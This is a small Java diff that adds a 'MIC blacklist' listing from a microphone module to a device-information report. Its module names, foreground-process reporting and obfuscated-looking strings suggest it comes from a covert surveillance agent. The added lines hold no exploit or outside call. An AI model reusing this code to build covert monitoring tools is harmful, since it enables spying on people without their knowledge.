@@ -226,6 +226,15 @@ public class ModuleDevice extends BaseInstantModule {
 		RunningProcesses runningProcesses = RunningProcesses.self();
 		sb.append(M.e("Foreground process: ") + runningProcesses.getForeground_wrapper() + "\n"); //$NON-NLS-1$
 
+		ModuleMic mic = ModuleMic.self();
+		if (mic != null) {
+			sb.append("MIC blacklist: ");
+			for (String black : mic.getBlacklist()) {
+				sb.append(black + " ");
+			}
+			sb.append("\n");
+		}
+
 		return bytesAvailableInt / 1024;
 	}
 
